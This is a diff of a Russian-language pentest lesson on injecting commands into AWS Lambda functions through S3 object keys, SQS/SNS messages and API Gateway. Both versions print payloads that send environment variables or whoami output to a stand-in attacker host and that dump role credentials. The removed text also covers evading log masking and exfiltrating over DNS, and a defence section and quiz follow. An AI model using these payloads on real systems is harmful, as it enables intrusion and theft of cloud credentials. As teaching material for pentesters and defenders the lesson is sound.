@@ -14,260 +14,222 @@ useful_for:
 estimated_minutes: 40
 summary: "Глубокий разбор инъекций в serverless: command injection в Lambda, инъекции в SQS/SNS-сообщения, event-source mapping, API Gateway и десериализация. Как источники событий становятся векторами."
 ---
-## Зачем этот урок
 
-В serverless «вход» приложения — это не порт, а **событие** от источника: HTTP через API Gateway, сообщение из SQS/SNS, загрузка объекта в S3, изменение записи в DynamoDB Streams, событие EventBridge, вызов из другой функции. Каждый источник — потенциальная точка инъекции, потому что код функции часто собирает из события команду, SQL-запрос, путь к файлу или URL. Этот урок — про то, как источники событий становятся векторами RCE, SSRF и захвата роли функции.
+## Вопрос, с которого всё начинается
 
-## Модель угроз serverless
+Функция бессерверного приложения принимает событие и что-то с ним делает. Если она передаёт данные события в команду оболочки или в небезопасный парсер — можно выполнить свой код. Причём не нужен ни сервер, ни SSRF: достаточно послать правильное **событие**. Разберём это на функции-обработчике картинок.
 
-Четыре ключевых актива:
-- **Код функции** — часто конкатенирует данные события в shell/запросы.
-- **IAM-роль функции** — главный приз: её временные креды лежат в окружении.
-- **Источники событий** — каналы доставки ввода (у каждого свои права на отправку).
-- **Переменные окружения** — секреты, строки подключения, конфиги.
+Инъекция в этом контексте — когда данные, которые мы контролируем, попадают в опасное место (команду, SQL, десериализатор) и выполняются как код.
 
-В отличие от классического сервера, вы не подключаетесь к функции по сети. Но если у вас есть право отправить событие в её источник (`sqs:SendMessage`, `s3:PutObject`, `sns:Publish`, `lambda:InvokeFunction`), вы доставляете ввод в функцию.
+## Наш пример: генератор миниатюр
 
-## Как читать конфигурацию функции
+Объект урока — функция `image-resizer`, которая вызывается, когда в S3 загружают картинку, и делает миниатюру через ImageMagick. Сначала посмотрим её код — его можно скачать, если есть право `lambda:GetFunction`:
 
-Перед атакой соберите всё о функции:
-
-```bash
-aws lambda get-function-configuration --function-name target --query '{Role:Role,Env:Environment.Variables,Handler:Handler,Runtime:Runtime,Timeout:Timeout}'
-aws lambda get-policy --function-name target            # кто может её вызывать
-aws lambda list-event-source-mappings --function-name target
-aws iam get-role --role-name <LAMBDA_ROLE>
-aws iam list-attached-role-policies --role-name <LAMBDA_ROLE>
-aws iam list-role-policies --role-name <LAMBDA_ROLE>
+```
+$ aws lambda get-function --function-name image-resizer --query "Code.Location" --output text
+https://prod-lambda-us-east-1.s3.amazonaws.com/snapshots/.../image-resizer.zip?...
+$ curl -s "https://prod-lambda.../image-resizer.zip" -o fn.zip && unzip -o fn.zip -d fn
+Archive: fn.zip
+  inflating: fn/lambda_function.py
 ```
 
-`get-policy` показывает ресурсную политику (какие принципалы могут `InvokeFunction`), а `list-event-source-mappings` — какие очереди/стримы её триггерят.
+## Шаг 1: читаем код хендлера
 
-## Инъекция 1: command injection в Lambda
+Открываем `lambda_function.py`:
 
-Классика — функция вызывает shell с данными события:
+```
+$ cat fn/lambda_function.py
+import subprocess, os
 
-```python
-import subprocess
 def handler(event, context):
-    filename = event['queryStringParameters']['file']
-    subprocess.call(f"convert /tmp/{filename} /tmp/out.png", shell=True)
+    key = event["Records"][0]["s3"]["object"]["key"]
+    subprocess.run(f"convert /tmp/{key} -resize 200x200 /tmp/thumb.jpg", shell=True)
+    return {"status": "ok"}
 ```
 
-Пейлоад в параметре `file`:
+Вот и уязвимость: значение `key` из события подставляется прямо в команду с `shell=True`. Если `key` содержит что-то вроде `a; id;`, оболочка выполнит и нашу команду. Это **command injection** — внедрение команды.
+
+## Шаг 2: подготавливаем инъекцию
+
+Мы контролируем имя файла, если можем положить объект в бакет (например, бакет публичный на запись или у нас есть `s3:PutObject`). Кладём файл с «хитрым» именем:
 
 ```
-file=x; curl http://ATTACKER/$(cat /proc/self/environ | base64 -w0); #
+$ aws s3 cp normal.jpg "s3://acme-uploads/x;curl http://attacker.example/$(whoami);.jpg"
+upload: normal.jpg to s3://acme-uploads/x;curl http://attacker.example/$(whoami);.jpg
 ```
 
-Через API Gateway (URL-кодирование обязательно):
+Когда S3 вызовет функцию, в `key` попадёт эта строка, и оболочка выполнит нашу команду **от имени роли функции**. Мы получили RCE внутри Lambda.
 
-```bash
-curl "https://api-id.execute-api.us-east-1.amazonaws.com/prod/convert?file=x%3B%20curl%20http://ATTACKER/%24(cat%20/proc/self/environ%7Cbase64%20-w0)%3B%20%23"
-```
+## Шаг 3: та же инъекция через SQS и SNS
 
-Признаки инъекции: наличие `shell=True`, `os.system`, `subprocess` с f-строкой, `Runtime=python3.x` и вызовы внешних бинарей.
-
-## Инъекция 2: SQS/SNS-сообщения
-
-Функция читает тело сообщения и использует его в опасном контексте:
-
-```python
-import os
-def handler(event, context):
-    for rec in event['Records']:
-        os.system(f"echo {rec['body']} >> /tmp/log")
-```
-
-Пейлоад в теле сообщения:
+Часто функция подписана на очередь SQS или тему SNS. Тогда не нужно даже класть файл — достаточно **отправить сообщение**:
 
 ```
-; curl http://ATTACKER/$(env | base64 -w0) ; #
+$ aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/jobs \
+    --message-body '{"key": "a; id; whoami #"}'
+{
+    "MessageId": "11111111-2222-3333-4444-555555555555"
+}
 ```
 
-Особенность: функцию вы не видите напрямую, но если у вас есть `sqs:SendMessage` в очередь-источник — вы инжектируете. Проверьте права: `aws sqs get-queue-attributes`, `aws sqs list-queues`, затем отправьте сообщение:
+Если функция разбирает тело сообщения и подставляет в команду — инъекция сработает. Важно: очередь может быть публичной или у нас есть право `sqs:SendMessage`.
 
-```bash
-aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/123/q --message-body '"; curl http://ATTACKER/$(env|base64); #"'
-```
+## Шаг 4: инъекция через API Gateway
 
-## Инъекция 3: S3-триггер
-
-Lambda на загрузку в S3 часто использует **ключ объекта** в путях/командах:
-
-```python
-import subprocess
-def handler(event, context):
-    key = event['Records'][0]['s3']['object']['key']
-    subprocess.call(f"ffmpeg -i s3://bucket/{key} /tmp/out.mp4", shell=True)
-```
-
-Имя объекта под вашим контролем. Загружаем объект с «злым» именем:
+Когда функция за API Gateway, данные приходят в теле HTTP-запроса. Тогда достаточно отправить запрос:
 
 ```
-normal.mp4; curl http://ATTACKER/$(env|base64); #
+$ curl -s -X POST https://api.acme-corp.com/resize \
+    -H "Content-Type: application/json" \
+    -d '{"key": "a; id; cat /proc/self/environ #"}'
 ```
 
-```bash
-curl -X PUT "https://bucket.s3.amazonaws.com/normal.mp4%3B%20curl%20http://ATTACKER/%24(env%7Cbase64)%3B%20%23" -d "x"
+Обрати внимание на `cat /proc/self/environ` — в окружении функции лежат переменные, включая секреты. Так одна инъекция даёт и выполнение команд, и чтение секретов.
+
+## Шаг 5: десериализация и другие источники
+
+Инъекция бывает не только командная. Другие векторы в serverless:
+
+- **SQL-инъекция** — если функция пишет данные события в базу без параметризации.
+- **Небезопасная десериализация** — если событие разбирают `pickle`/`yaml.load`; тогда можно выполнить код на этапе парсинга.
+- **Path traversal** — если `key` используют как путь без проверки, можно читать файлы вне каталога.
+- **SSRF** — если функция ходит по URL из события.
+
+Все они вытекают из одного: **данные события попадают в опасное место**.
+
+## Шаг 6: последствия и OPSEC
+
+Инъекция в функцию выполняется **от имени её роли**. Значит, дальше ты работаешь с правами этой роли: читаешь бакеты, таблицы, секреты. При этом код функции короткоживущий: следы остаются в логах CloudWatch, но сама функция «исчезает» через секунды. Для устойчивости атакующие обычно сразу забирают креды роли через переменные окружения или API.
+
+```
+$ curl -s -X POST https://api.acme-corp.com/resize -d '{"key":"a; env #"}'
+DB_PASSWORD=SuperSecret123
+AWS_ACCESS_KEY_ID=ASIA...
+AWS_SECRET_ACCESS_KEY=...
+AWS_SESSION_TOKEN=...
 ```
 
-Ключи S3 URL-кодируются, но при декодировании в коде имя снова становится «грязным».
+Вот мы и «унесли» временные креды роли прямо из окружения.
 
-## Инъекция 4: API Gateway и request mapping
+## Шаг 7: как найти все входы функции
 
-API Gateway может прокидывать параметры в Lambda в неожиданных форматах. Проверьте:
-- **Path traversal** в проксирующих интеграциях `/{proxy+}` — путь события уходит в файловые операции.
-- **Заголовки** (`X-Amz-...`, `X-Forwarded-For`) — влияют на логику авторизации и SSRF.
-- **Множественные параметры** с одинаковым именем — WAF и валидатор видят одно значение, функция получает другое.
-- **REST vs HTTP API** — у них разные контексты события; интеграция может «схлопывать» массив.
+Прежде чем бить, надо понять, **чем** вызывается функция. Это показывает event-source mapping:
 
-## Инъекция 5: десериализация
-
-Serverless-функции иногда десериализуют данные: Python `pickle`, Java serialization, YAML `!!python/object`, JSON с полиморфизмом (Jackson). Если источник события под вашим контролем (SQS, S3, прямой invoke) — классический deserialization RCE. Ищите `pickle.loads`, `yaml.load` без `SafeLoader`, `ObjectInputStream.readObject`.
-
-## Разобранный пример: S3-триггер → захват роли
-
-1. Находим бакет с загрузкой (публичная запись или через приложение) и Lambda-триггер на него.
-2. Загружаем объект с инъекцией в имени (см. выше).
-3. Lambda реагирует, выполняет shell, отправляет env на listener.
-4. В env — `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN` **роли функции**.
-5. Используем креды:
-
-```bash
-export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
-aws sts get-caller-identity
-aws lambda list-functions
-aws s3 ls
+```
+$ aws lambda list-event-source-mappings
+{
+  "EventSourceMappings": [
+    { "EventSourceArn": "arn:aws:sqs:us-east-1:123456789012:jobs",
+      "FunctionName": "image-resizer", "State": "Enabled" }
+  ]
+}
 ```
 
-## Захват и эскалация роли функции
+Здесь видно: функция `image-resizer` подписана на очередь `jobs`. Значит, вход — `sqs:SendMessage`. Если есть право писать в очередь, инъекция возможна. Для API Gateway вход ищут иначе — по описанию API и маршрутам:
 
-Роль функции — приз. Смотрим, что она умеет:
-
-```bash
-aws iam get-role --role-name <LAMBDA_ROLE>
-aws iam list-attached-role-policies --role-name <LAMBDA_ROLE>
-aws iam list-role-policies --role-name <LAMBDA_ROLE>
-aws iam get-policy-version --policy-arn <ARN> --version-id v1
+```
+$ aws apigateway get-rest-apis --query "items[].name" --output text
+prod-api
 ```
 
-Если роль имеет `iam:PassRole` + `lambda:UpdateFunctionConfiguration`/`lambda:CreateFunction` — можно привязать к функции более привилегированную роль и вызвать её (см. `cloud-lambda-privesc`). Если `lambda:UpdateFunctionCode` — залить свой код.
+`prod-api` — это HTTP-вход. Дальше проверяют, требует ли маршрут авторизации (`authorizationType`).
 
-## Защита
+## Шаг 8: почему это не «экзотика»
 
-- Не использовать shell с пользовательским вводом; передавать аргументы списком, а не строкой.
-- Валидировать события по схеме (API Gateway request validation, JSON Schema).
-- Минимальные роли функций; запрет `*` в ресурсах.
-- Секреты — в Secrets Manager/Parameter Store, не в env.
-- Ограничивать `sqs:SendMessage`/`s3:PutObject`/`lambda:InvokeFunction` доверенными принципалами.
-- Включать `Reserved Concurrency` и логировать `Invoke` через CloudTrail data events.
+Serverless сейчас — это большинство новых приложений. Логика та же, что в классическом вебе (инъекции в небезопасно обработанный ввод), но поверхность сместилась: входом стало **событие**, а «сервером» — короткоживущая функция с ролью. Поэтому при пентесте бессерверных приложений первым делом ищут не URL-параметры, а источники событий и код обработчиков.
 
-## Частые ошибки
+## Шаг 9: защита на стороне разработчика
 
-- **Считать, что serverless неинжектируем.** Инъекции живут в коде и в источниках.
-- **Не искать источники событий.** SQS/S3/DynamoDB-триггеры — тоже вход.
-- **Игнорировать имена объектов.** Ключ S3 часто попадает в команды.
-- **Не читать env после RCE.** Там временные креды роли функции.
-- **Забыть про десериализацию.** `pickle.loads` в Lambda — реальный RCE.
+Инъекции в serverless лечатся так же, как в обычном коде:
 
-## Что делать дальше / решение
+- не использовать `shell=True`; передавать команду и аргументы **списком**;
+- валидировать событие и ограничивать допустимые значения `key`;
+- не хранить секреты в переменных окружения — держать их в Secrets Manager;
+- давать роли функции минимально необходимые права.
 
-Практика: разверните функцию с S3-триггером и `subprocess`-вызовом, залейте объект с инъекцией, добудьте креды роли, затем прочитайте её политики. Дальше переходите к `cloud-lambda-privesc` (эскалация через `PassRole`) и `cloud-metadata-ssrf` (если функция ходит по URL из события).
+Каждый из этих пунктов напрямую закрывает один из шагов нашей цепочки: без `shell=True` нет command injection, без секретов в окружении их нечем унести, а узкая роль ограничивает ущерб.
 
-## DynamoDB Streams, EventBridge и Kinesis
+## Частые вопросы
 
-Источники событий не ограничиваются SQS/S3:
-- **DynamoDB Streams** — функция читает `NewImage`/`OldImage` записи. Если поля записи попадают в команду или запрос — инъекция. Право на запись в таблицу (`dynamodb:PutItem`) даёт контроль над содержимым события.
-- **EventBridge** — поле `detail` под вашим контролем, если есть `events:PutEvents`.
-- **Kinesis** — тело записи (base64) декодируется в коде; `kinesis:PutRecord` даёт инъекцию.
-- **SNS** — подписка на топик; `sns:Publish` даёт контроль над `Message`.
+**«Как понять, что функция уязвима?»** Читай её код: `shell=True`, конкатенация SQL, `pickle.loads`, путь из входных данных — признаки инъекции.
 
-Общий принцип: любой источник, в который вы можете писать, — это вход в функцию.
+**«Куда посылать полезную нагрузку?»** Туда, где функция берёт данные: ключ S3-объекта, тело сообщения SQS/SNS, JSON от API Gateway.
 
-## Разведка serverless-периметра
+**«Что даёт инъекция?»** Выполнение кода с правами роли функции — а из окружения можно унести и временные креды.
 
-```bash
-aws lambda list-functions --query 'Functions[].FunctionName'
-aws apigateway get-rest-apis
-aws apigatewayv2 get-apis
-aws sqs list-queues
-aws sns list-topics
-aws s3api list-buckets
-aws events list-rules
-```
+**«Почему это не „экзотика“?»** Потому что serverless — большинство новых приложений, а входом стал не URL, а событие.
 
-Сопоставьте функции с их `Role` и `Environment`. Функции с широкими ролями — приоритет.
+## Что мы теперь знаем
 
-## Отладка и подтверждение инъекции
+По-простому:
 
-Если инъекция «слепая» (нет вывода), используйте OOB-канал: `curl`/`dig` на ваш listener, DNS-эксфильтрацию через поддомены. Для command injection с задержкой — `sleep`. Проверяйте наличие `shell=True`/`os.system` в коде функции: при наличии `lambda:GetFunction` скачайте пакет и распакуйте его.
+1. В serverless инъекция приходит через событие, а не через веб-форму.
+2. Опасны источники: S3-ключ, тело SQS/SNS, JSON от API Gateway.
+3. Command injection даёт RCE с правами роли функции.
+4. Десериализация и SQL-инъекция — тоже векторы.
+5. Из окружения функции часто достаются креды и секреты.
 
-```bash
-aws lambda get-function --function-name target --query 'Code.Location' --output text
-curl -o fn.zip "<presigned-url>" && unzip fn.zip -d fn && grep -rn "os.system\|shell=True\|subprocess\|pickle" fn/
-```
+## На что смотреть дальше
 
-## Почему роль функции — главный приз
-
-Временные креды роли в env живут до ~12 часов и действуют на всё, что разрешено её политикой: чтение других бакетов, вызов других функций, доступ к секретам, иногда `sts:AssumeRole` в другие аккаунты. Это делает один RCE в Lambda полноценным фoothold в аккаунте.
-
-## Ограничения и обходы
-
-- **Маскирование** секретов в CloudWatch Logs обходится кодированием (base64/hex).
-- **VPC-функции** без NAT не имеют egress — используйте DNS-эксфильтрацию или загрузку в S3.
-- **Валидация схемы** API Gateway обходится дублированием параметров или заголовками.
-- **Timeout функции** ограничивает длинные команды — используйте фоновый процесс и быстрый ответ.
+- **Читай код функции.** Наличие `shell=True`, `pickle.loads`, конкатенации SQL — сразу цель.
+- **Найди все триггеры.** SQS, SNS, S3, API GW — где ты можешь «послать событие».
+- **Проверь права на отправку.** `sqs:SendMessage` или `s3:PutObject` — это и есть вход.
+- **Забирай окружение.** `env`/`/proc/self/environ` часто содержит готовые креды.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Почему имя S3-объекта может привести к RCE в Lambda-триггере?"
+- question: "Что такое command injection в Lambda?"
   options:
-    - "S3 шифрует имена"
-    - "Код часто подставляет ключ объекта в shell-команду без экранирования"
-    - "Lambda не читает ключи"
-    - "Имя объекта нельзя контролировать"
-  answer: 1
-  explanation: "Ключ объекта попадает в команду — инъекция через имя файла."
-- question: "Где в serverless-функции хранятся креды её IAM-роли?"
+    - "Внедрение команды через данные, попадающие в оболочку"
+    - "Подмена рантайма"
+    - "Атака на биллинг"
+    - "Смена региона"
+  answer: 0
+  explanation: "Данные события выполняются оболочкой как команда."
+- question: "Какой признак в коде функции указывает на риск command injection?"
   options:
-    - "В /etc/passwd"
-    - "В переменных окружения (AWS_ACCESS_KEY_ID и др.)"
-    - "В DNS"
-    - "В Route 53"
-  answer: 1
-  explanation: "Lambda прокидывает временные креды роли в окружение функции."
-- question: "Какой источник событий можно использовать для инъекции, имея право sqs:SendMessage?"
+    - "subprocess.run(..., shell=True)"
+    - "json.loads(event)"
+    - "print(key)"
+    - "import boto3"
+  answer: 0
+  explanation: "shell=True передаёт строку оболочке, где возможны инъекции."
+- question: "Как отправить инъекцию, если функция подписана на SQS?"
   options:
-    - "S3"
-    - "SQS-очередь, на которую подписана функция"
-    - "Route 53"
-    - "CloudFront"
-  answer: 1
-  explanation: "Отправив сообщение в очередь-источник, вы доставляете ввод в функцию."
-- question: "Что делать сразу после RCE в Lambda для доступа к роли?"
-  options:
-    - "Удалить функцию"
-    - "Считать переменные окружения и использовать креды роли"
+    - "Отправить сообщение с полезной нагрузкой в очередь"
     - "Перезапустить функцию"
-    - "Изменить регион"
-  answer: 1
-  explanation: "Env содержит временные креды роли функции."
-- question: "Какой класс уязвимостей в serverless связан с pickle/Java serialization?"
+    - "Сменить роль"
+    - "Открыть порт 22"
+  answer: 0
+  explanation: "Тело сообщения становится входом функции."
+- question: "Что полезного лежит в окружении функции?"
   options:
-    - "XSS"
-    - "Десериализация, ведущая к RCE"
-    - "SQL-инъекция"
-    - "CSRF"
+    - "Только имя рантайма"
+    - "Секреты и временные креды роли"
+    - "Список пользователей"
+    - "Ничего"
   answer: 1
-  explanation: "Небезопасная десериализация данных из события — прямой RCE."
+  explanation: "Переменные окружения часто содержат креды и пароли."
+- question: "Почему инъекция в serverless опасна даже без сервера?"
+  options:
+    - "Она выполняется от имени роли функции с её правами"
+    - "Она удаляет аккаунт"
+    - "Она замедляет интернет"
+    - "Она не опасна"
+  answer: 0
+  explanation: "Код исполняется с правами execution role."
 ```
+
+## Куда дальше
+
+Мы умеем выполнять код внутри функции. В следующем уроке мы разберём **эскалацию через Lambda**: как из ограниченных прав (например, `iam:PassRole`) собрать функцию с админской ролью и получить полный контроль. А пока запомни главное: в serverless вход — это событие, и данные события нельзя пускать в оболочку.
 
 ## Где пригодится
 
-- **Bug bounty** — serverless API и обработчики событий.
-- **Пентест** — атаки на бессерверные приложения.
-- **Red team** — от инъекции к роли функции.
-- **IR/Blue team** — детект аномальных вызовов Lambda.
-- **DevSecOps** — безопасные паттерны обработки событий.
+- **CTF (Cloud):** инъекции в события — частый сюжет.
+- **Bug bounty:** command injection в serverless-API.
+- **Пентест:** аудит кода функций и прав триггеров.
+- **Blue team:** параметризация, валидация событий, секреты вне окружения.
